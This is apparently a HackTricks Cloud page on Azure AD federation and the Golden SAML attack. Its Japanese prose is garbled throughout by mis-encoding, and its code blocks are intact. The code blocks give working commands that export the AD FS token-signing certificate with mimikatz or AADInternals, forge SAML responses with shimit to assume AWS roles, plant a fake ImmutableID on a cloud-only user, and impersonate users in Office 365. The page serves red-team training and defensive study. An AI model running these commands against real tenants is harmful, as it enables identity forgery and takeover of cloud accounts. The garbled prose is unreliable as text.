# Az - Federation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ï¼
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚
* **PRã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹** [**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã€‚

</details>
{% endhint %}

## åŸºæœ¬æƒ…å ±

[ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‹ã‚‰:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-fed)**Federation**ã¯ã€**ä¿¡é ¼**ã‚’ç¢ºç«‹ã—ãŸ**ãƒ‰ãƒ¡ã‚¤ãƒ³**ã®é›†åˆã§ã™ã€‚ä¿¡é ¼ã®ãƒ¬ãƒ™ãƒ«ã¯ã•ã¾ã–ã¾ã§ã™ãŒã€é€šå¸¸ã¯**èªè¨¼**ã‚’å«ã¿ã€ã»ã¨ã‚“ã©ã®å ´åˆ**èªå¯**ã‚’å«ã¿ã¾ã™ã€‚å…¸å‹çš„ãªãƒ•ã‚§ãƒ‡ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã«ã¯ã€**ãƒªã‚½ãƒ¼ã‚¹ã®å…±æœ‰ã‚¢ã‚¯ã‚»ã‚¹**ã®ãŸã‚ã«**ä¿¡é ¼**ã‚’ç¢ºç«‹ã—ãŸ**è¤‡æ•°ã®çµ„ç¹”**ãŒå«ã¾ã‚Œã¾ã™ã€‚

ã‚ªãƒ³ãƒ—ãƒ¬ãƒŸã‚¹ç’°å¢ƒã‚’**Azure AD**ã¨**ãƒ•ã‚§ãƒ‡ãƒ¬ãƒ¼ãƒˆ**ã—ã€ã“ã®ãƒ•ã‚§ãƒ‡ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã‚’èªè¨¼ã¨èªå¯ã«ä½¿ç”¨ã§ãã¾ã™ã€‚ã“ã®ã‚µã‚¤ãƒ³ã‚¤ãƒ³æ–¹æ³•ã¯ã€ã™ã¹ã¦ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼**èªè¨¼ãŒã‚ªãƒ³ãƒ—ãƒ¬ãƒŸã‚¹ã§è¡Œã‚ã‚Œã‚‹**ã“ã¨ã‚’ä¿è¨¼ã—ã¾ã™ã€‚ã“ã®æ–¹æ³•ã«ã‚ˆã‚Šã€ç®¡ç†è€…ã¯ã‚ˆã‚Šå³æ ¼ãªã‚¢ã‚¯ã‚»ã‚¹åˆ¶å¾¡ãƒ¬ãƒ™ãƒ«ã‚’å®Ÿè£…ã§ãã¾ã™ã€‚**AD FS**ãŠã‚ˆã³PingFederateã¨ã®ãƒ•ã‚§ãƒ‡ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãŒåˆ©ç”¨å¯èƒ½ã§ã™ã€‚

<figure><img src="../../../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

åŸºæœ¬çš„ã«ã€ãƒ•ã‚§ãƒ‡ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã§ã¯ã™ã¹ã¦ã®**èªè¨¼**ãŒ**ã‚ªãƒ³ãƒ—ãƒ¬ãƒŸã‚¹**ç’°å¢ƒã§è¡Œã‚ã‚Œã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã™ã¹ã¦ã®ä¿¡é ¼ã•ã‚ŒãŸç’°å¢ƒã§SSOã‚’ä½“é¨“ã—ã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯**ã‚ªãƒ³ãƒ—ãƒ¬ãƒŸã‚¹ã®è³‡æ ¼æƒ…å ±**ã‚’ä½¿ç”¨ã—ã¦**ã‚¯ãƒ©ã‚¦ãƒ‰**ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«**ã‚¢ã‚¯ã‚»ã‚¹**ã§ãã¾ã™ã€‚

**Security Assertion Markup Language (SAML)**ã¯ã€ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼é–“ã§èªè¨¼ãŠã‚ˆã³èªå¯ã®**æƒ…å ±**ã‚’**äº¤æ›**ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

ãƒ•ã‚§ãƒ‡ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—ã«ã¯3ã¤ã®å½“äº‹è€…ãŒã„ã¾ã™ï¼š

* ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¾ãŸã¯ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆ
* Identity Provider (IdP)
* Service Provider (SP)

(ç”»åƒã¯https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-appsã‹ã‚‰)

<figure><img src="../../../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

1. æœ€åˆã«ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ï¼ˆService Providerã¾ãŸã¯SPã€ä¾‹ãˆã°AWSã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã‚„vSphereã‚¦ã‚§ãƒ–ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆï¼‰ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¾ã™ã€‚ã“ã®ã‚¹ãƒ†ãƒƒãƒ—ã¯ç‰¹å®šã®å®Ÿè£…ã«ã‚ˆã£ã¦ã¯ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚’ç›´æ¥IdPï¼ˆIdentity Providerï¼‰ã«ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆã™ã‚‹ã“ã¨ã‚‚ã‚ã‚Šã¾ã™ã€‚
2. æ¬¡ã«ã€SPã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼èªè¨¼ã®ãŸã‚ã«é©åˆ‡ãªIdPï¼ˆä¾‹ï¼šAD FSã€Oktaï¼‰ã‚’ç‰¹å®šã—ã¾ã™ã€‚SPã¯SAMLï¼ˆSecurity Assertion Markup Languageï¼‰AuthnRequestã‚’ä½œæˆã—ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚’é¸æŠã—ãŸIdPã«ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆã—ã¾ã™ã€‚
3. IdPã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’èªè¨¼ã—ã¾ã™ã€‚èªè¨¼å¾Œã€IdPã¯SAMLResponseã‚’ä½œæˆã—ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä»‹ã—ã¦SPã«é€ä¿¡ã—ã¾ã™ã€‚
4. æœ€å¾Œã«ã€SPã¯SAMLResponseã‚’è©•ä¾¡ã—ã¾ã™ã€‚ä¿¡é ¼ã§ãã‚‹IdPã‹ã‚‰ç™ºè¡Œã•ã‚ŒãŸã‚‚ã®ã§ã‚ã‚‹ã¨ç¢ºèªã•ã‚Œã‚Œã°ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã‚¢ã‚¯ã‚»ã‚¹ãŒè¨±å¯ã•ã‚Œã¾ã™ã€‚ã“ã‚Œã§ãƒ­ã‚°ã‚¤ãƒ³ãƒ—ãƒ­ã‚»ã‚¹ãŒå®Œäº†ã—ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã‚µãƒ¼ãƒ“ã‚¹ã‚’åˆ©ç”¨ã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚

**SAMLèªè¨¼ã¨ä¸€èˆ¬çš„ãªæ”»æ’ƒã«ã¤ã„ã¦ã‚‚ã£ã¨çŸ¥ã‚ŠãŸã„å ´åˆã¯ã€ä»¥ä¸‹ã‚’å‚ç…§ã—ã¦ãã ã•ã„ï¼š**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## ãƒ”ãƒœãƒƒãƒˆ

* AD FSã¯ã‚¯ãƒ¬ãƒ¼ãƒ ãƒ™ãƒ¼ã‚¹ã®ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ãƒ¢ãƒ‡ãƒ«ã§ã™ã€‚
* "..ã‚¯ãƒ¬ãƒ¼ãƒ ã¯å˜ã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã¤ã„ã¦ã®å£°æ˜ï¼ˆä¾‹ãˆã°ã€åå‰ã€ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ã€ã‚°ãƒ«ãƒ¼ãƒ—ï¼‰ã§ã‚ã‚Šã€ä¸»ã«ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆä¸Šã®ã©ã“ã«ã§ã‚‚ã‚ã‚‹ã‚¯ãƒ¬ãƒ¼ãƒ ãƒ™ãƒ¼ã‚¹ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’èªå¯ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚"
* ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã‚¯ãƒ¬ãƒ¼ãƒ ã¯SAMLãƒˆãƒ¼ã‚¯ãƒ³å†…ã«æ›¸ã‹ã‚Œã€IdPã«ã‚ˆã£ã¦æ©Ÿå¯†æ€§ã‚’æä¾›ã™ã‚‹ãŸã‚ã«ç½²åã•ã‚Œã¾ã™ã€‚
* ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ImmutableIDã«ã‚ˆã£ã¦è­˜åˆ¥ã•ã‚Œã¾ã™ã€‚ã“ã‚Œã¯ã‚°ãƒ­ãƒ¼ãƒãƒ«ã«ä¸€æ„ã§ã‚ã‚Šã€Azure ADã«ä¿å­˜ã•ã‚Œã¾ã™ã€‚
* ImmutableIDã¯ã‚ªãƒ³ãƒ—ãƒ¬ãƒŸã‚¹ã§ã¯ms-DS-ConsistencyGuidã¨ã—ã¦ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ä¿å­˜ã•ã‚Œã¦ã„ã‚‹ã‹ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®GUIDã‹ã‚‰æ´¾ç”Ÿã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
* è©³ç´°ã¯[https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

**Golden SAMLæ”»æ’ƒï¼š**

* ADFSã§ã¯ã€SAML Responseã¯ãƒˆãƒ¼ã‚¯ãƒ³ç½²åè¨¼æ˜æ›¸ã«ã‚ˆã£ã¦ç½²åã•ã‚Œã¾ã™ã€‚
* è¨¼æ˜æ›¸ãŒæ¼æ´©ã™ã‚‹ã¨ã€Azure ADã«åŒæœŸã•ã‚ŒãŸä»»æ„ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦Azure ADã«èªè¨¼ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã«ãªã‚Šã¾ã™ï¼
* PTAã®æ‚ªç”¨ã¨åŒæ§˜ã«ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰å¤‰æ›´ã‚„MFAã¯å½±éŸ¿ã‚’ä¸ãˆã¾ã›ã‚“ã€‚ãªãœãªã‚‰ã€èªè¨¼å¿œç­”ã‚’å½é€ ã—ã¦ã„ã‚‹ã‹ã‚‰ã§ã™ã€‚
* è¨¼æ˜æ›¸ã¯DAæ¨©é™ã‚’æŒã¤AD FSã‚µãƒ¼ãƒãƒ¼ã‹ã‚‰æŠ½å‡ºã§ãã€ãã®å¾Œã€ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã«æ¥ç¶šã•ã‚ŒãŸä»»æ„ã®ãƒã‚·ãƒ³ã‹ã‚‰ä½¿ç”¨ã§ãã¾ã™ã€‚
* è©³ç´°ã¯[https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

### Golden SAML

**Identity Provider (IdP)**ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚µã‚¤ãƒ³ã‚¤ãƒ³ã‚’èªå¯ã™ã‚‹ãŸã‚ã«**SAMLResponse**ã‚’ç”Ÿæˆã™ã‚‹ãƒ—ãƒ­ã‚»ã‚¹ã¯éå¸¸ã«é‡è¦ã§ã™ã€‚IdPã®ç‰¹å®šã®å®Ÿè£…ã«å¿œã˜ã¦ã€**å¿œç­”**ã¯**ç½²å**ã¾ãŸã¯**æš—å·åŒ–**ã•ã‚Œã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚ã“ã®æ‰‹é †ã«ã‚ˆã‚Šã€**Service Provider (SP)**ã¯SAMLResponseã®ä¿¡é ¼æ€§ã‚’ç¢ºèªã—ã€ãã‚ŒãŒä¿¡é ¼ã§ãã‚‹IdPã«ã‚ˆã£ã¦ç™ºè¡Œã•ã‚ŒãŸã‚‚ã®ã§ã‚ã‚‹ã“ã¨ã‚’ä¿è¨¼ã—ã¾ã™ã€‚

[golden ticketæ”»æ’ƒ](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket)ã¨åŒæ§˜ã«ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ã¨æ¨©é™ã‚’èªè¨¼ã™ã‚‹ã‚­ãƒ¼ï¼ˆgolden ticketã®å ´åˆã¯KRBTGTã€golden SAMLã®å ´åˆã¯ãƒˆãƒ¼ã‚¯ãƒ³ç½²åã®ç§˜å¯†éµï¼‰ã‚’æ“ä½œã—ã¦**èªè¨¼ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆ**ï¼ˆTGTã¾ãŸã¯SAMLResponseï¼‰ã‚’å½é€ ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ä»»æ„ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’å½è£…ã—ã€SPã¸ã®ä¸æ­£ã‚¢ã‚¯ã‚»ã‚¹ãŒå¯èƒ½ã«ãªã‚Šã¾ã™ã€‚

Golden SAMLã«ã¯ä»¥ä¸‹ã®åˆ©ç‚¹ãŒã‚ã‚Šã¾ã™ï¼š

* **ãƒªãƒ¢ãƒ¼ãƒˆã§ä½œæˆ**ã§ãã€å¯¾è±¡ã®ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚„ãƒ•ã‚§ãƒ‡ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã®ä¸€éƒ¨ã§ã‚ã‚‹å¿…è¦ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚
* **äºŒè¦ç´ èªè¨¼ (2FA)** ãŒæœ‰åŠ¹ã§ã‚‚åŠ¹æœãŒã‚ã‚Šã¾ã™ã€‚
* ãƒˆãƒ¼ã‚¯ãƒ³ç½²åã®**ç§˜å¯†éµã¯è‡ªå‹•çš„ã«æ›´æ–°ã•ã‚Œã¾ã›ã‚“**ã€‚
* **ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å¤‰æ›´ã—ã¦ã‚‚**ã€æ—¢ã«ç”Ÿæˆã•ã‚ŒãŸSAMLã¯ç„¡åŠ¹ã«ãªã‚Šã¾ã›ã‚“ã€‚

#### AWS + AD FS + Golden SAML

[Active Directory Federation Services (AD FS)](https://docs.microsoft.com/en-us/previous-versions/windows/server-2008/bb897402\(v=msdn.10\))ã¯ã€ä¿¡é ¼ã§ãã‚‹ãƒ“ã‚¸ãƒã‚¹ãƒ‘ãƒ¼ãƒˆãƒŠãƒ¼ï¼ˆãƒ•ã‚§ãƒ‡ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ï¼‰é–“ã§**ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£æƒ…å ±ã®å®‰å…¨ãªäº¤æ›**ã‚’ä¿ƒé€²ã™ã‚‹Microsoftã®ã‚µãƒ¼ãƒ“ã‚¹ã§ã™ã€‚åŸºæœ¬çš„ã«ã€ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚µãƒ¼ãƒ“ã‚¹ãŒãƒ•ã‚§ãƒ‡ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³å†…ã®ä»–ã®ã‚µãƒ¼ãƒ“ã‚¹ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ã¨ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ã‚’å…±æœ‰ã§ãã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚

AWSãŒä¾µå®³ã•ã‚ŒãŸãƒ‰ãƒ¡ã‚¤ãƒ³ã‚’ä¿¡é ¼ã—ã¦ã„ã‚‹å ´åˆã€ã“ã®è„†å¼±æ€§ã‚’åˆ©ç”¨ã—ã¦**AWSç’°å¢ƒå†…ã®ä»»æ„ã®æ¨©é™ã‚’å–å¾—**ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ã“ã®æ”»æ’ƒã«ã¯ã€SAMLã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ç½²åã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹**ç§˜å¯†éµ**ãŒå¿…è¦ã§ã™ã€‚ã“ã‚Œã¯golden ticketæ”»æ’ƒã§KRBTGTãŒå¿…è¦ãªã“ã¨ã«ä¼¼ã¦ã„ã¾ã™ã€‚AD FSãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ãŒã‚ã‚Œã°ã€ã“ã®ç§˜å¯†éµã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

Golden SAMLæ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã®è¦ä»¶ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š

* **ãƒˆãƒ¼ã‚¯ãƒ³ç½²åã®ç§˜å¯†éµ**
* **IdPã®å…¬é–‹è¨¼æ˜æ›¸**
* **IdPã®åå‰**
* **ãƒ­ãƒ¼ãƒ«åï¼ˆå¼•ãå—ã‘ã‚‹ãƒ­ãƒ¼ãƒ«ï¼‰**
* ãƒ‰ãƒ¡ã‚¤ãƒ³\ãƒ¦ãƒ¼ã‚¶ãƒ¼å
* AWSã®ãƒ­ãƒ¼ãƒ«ã‚»ãƒƒã‚·ãƒ§ãƒ³å
* Amazonã‚¢ã‚«ã‚¦ãƒ³ãƒˆID

_å¤ªå­—ã®é …ç›®ã®ã¿ãŒå¿…é ˆã§ã™ã€‚ä»–ã®é …ç›®ã¯ä»»æ„ã«å…¥åŠ›ã§ãã¾ã™ã€‚_

**ç§˜å¯†éµ**ã‚’å–å¾—ã™ã‚‹ã«ã¯ã€**AD FSãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ**ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ãŒå¿…è¦ã§ã™ã€‚ãã“ã‹ã‚‰ã€ç§˜å¯†éµã‚’[mimikatz](https://github.com/gentilkiwi/mimikatz)ãªã©ã®ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦**å€‹äººã‚¹ãƒˆã‚¢ã‹ã‚‰ã‚¨ã‚¯ã‚¹ãƒãƒ¼ãƒˆ**ã§ãã¾ã™ã€‚ä»–ã®å¿…è¦ãªæƒ…å ±ã‚’åé›†ã™ã‚‹ã«ã¯ã€ADFSãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ã„ã‚‹ã“ã¨ã‚’ç¢ºèªã—ã€Microsoft.Adfs.Powershellã‚¹ãƒŠãƒƒãƒ—ã‚¤ãƒ³ã‚’ä½¿ç”¨ã—ã¾ã™ï¼š
```powershell
# From an "AD FS" session
# After having exported the key with mimikatz

# ADFS Public Certificate
[System.Convert]::ToBase64String($cer.rawdata)

# IdP Name
(Get-ADFSProperties).Identifier.AbsoluteUri

# Role Name
(Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```
ã™ã¹ã¦ã®æƒ…å ±ã‚’ä½¿ç”¨ã—ã¦ã€[**shimit**](https://github.com/cyberark/shimit) ã‚’ä½¿ç”¨ã—ã¦å½è£…ã—ãŸã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦æœ‰åŠ¹ãª SAMLResponse ã‚’å¿˜ã‚Œã‚‹ã“ã¨ãŒã§ãã¾ã™**:**

{% code overflow="wrap" %}
```bash
# Apply session for AWS cli
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
# idp - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust
# pk - Private key file full path (pem format)
# c - Certificate file full path (pem format)
# u - User and domain name e.g. domain\username (use \ or quotes in *nix)
# n - Session name in AWS
# r - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.
# id - AWS account id e.g. 123456789012

# Save SAMLResponse to file
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

### ã‚ªãƒ³ãƒ—ãƒ¬ãƒŸã‚¹ -> ã‚¯ãƒ©ã‚¦ãƒ‰
```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```
ã‚¯ãƒ©ã‚¦ãƒ‰ã®ã¿ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ImmutableIDã‚’ä½œæˆã—ã€ãã‚Œã‚‰ã‚’å½è£…ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™
```powershell
# Create a realistic ImmutableID and set it for a cloud only user
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
## å‚è€ƒæ–‡çŒ®

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

{% hint style="success" %}
AWS Hackingã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hackingã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹ã€‚**
* **PRã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹** [**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«ã€‚

</details>
{% endhint %}
